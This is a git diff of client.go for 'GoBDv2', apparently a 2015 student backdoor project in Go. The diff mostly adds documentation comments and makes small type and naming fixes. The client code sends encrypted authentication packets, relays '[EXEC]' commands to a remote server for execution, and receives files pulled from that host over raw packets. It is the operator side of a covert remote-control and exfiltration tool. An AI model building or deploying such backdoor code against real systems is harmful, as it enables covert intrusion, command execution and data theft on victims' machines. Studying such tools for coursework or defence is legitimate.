@@ -1,5 +1,15 @@
 package main
-
+/* client.go
+   PROGRAM: GoBDv2 Final
+   AUTHOR: Ramzi Chennafi
+   DATE: November 18 2015
+   FUNCTIONS:
+         intiatClient(string, uint16, uint16)
+         fileWait(string, string, uint16) 
+         sendAuthPacket(string, string, uint16)    
+   ABOUT:
+   Main body of code for the client, handles all commands and responses.
+*/
 import(
 	"os"
 	"fmt"
@@ -13,14 +23,13 @@ import(
 	"bytes"
 	"encoding/binary"
 )
-
 /* 
-    FUNCTION: func intiateClient(ip string, port, lport in)
+    FUNCTION: func intiateClient(ip string, port, lport uint16)
     RETURNS: Nothing
     ARGUMENTS: 
                 string ip : the ip address of the server
-                int port : port to send data to
-                int lport : port to listen for data on
+                uint16 port : port to send data to
+                uint16 lport : port to listen for data on
 
     ABOUT:
     Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
@@ -63,15 +72,24 @@ func intiateClient(ip string, port, lport uint16){
 				go fileWait(ip, args[1], lport)
 			}
 		} else if input == "?help" {
-			fmt.Print(helpStr);
+			fmt.Print(HELPSTR);
 			continue;
 		} else {
 			sendEncryptedData(port, "[EXEC]" + input, ip, CMD);
 		}
 	}
 }
-
-
+/* 
+    FUNCTION: sendAuthPacket(ip, authstr string, port uint16)
+    RETURNS: Nothing
+    ARGUMENTS: 
+                string ip - the ip address of the server
+                int port  - port to send data to
+                string authstr - the authentication string to send
+    ABOUT:
+    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
+    server if correct. Then idles waiting for user input and server output. Also provides help documentation
+*/
 func sendAuthPacket(ip, authstr string, port uint16){
 
 	cryptdata := encrypt_data([]byte(authstr))
@@ -81,7 +99,17 @@ func sendAuthPacket(ip, authstr string, port uint16){
 	err := handle.WritePacketData(bbuffer);
 	checkError(err)
 }
-
+/* 
+    FUNCTION: fileWait(ip, filename string, lport uint16)
+    RETURNS: Nothing
+    ARGUMENTS: 
+                string ip - the ip address of the server
+                string filename - the file we are waiting for
+                uint16 lport - the port we're listening on
+    ABOUT:
+    Waits as a seperate thread for incoming file data on the lport + 1. Upon recieving a 
+    FSND_COMPLETE packet, saves the recieved file and shuts the thread down.
+*/
 func fileWait(ip, filename string, lport uint16){
 
 	var ipLayer layers.IPv4
@@ -120,7 +148,7 @@ func fileWait(ip, filename string, lport uint16){
 			checkError(err)
 
 			fmt.Printf("File transfer %s completed. Transfered: %d bytes", filename, fBuffer.Len())
-			fBuffer.Reset()
+			return
 		}
 	}
 }
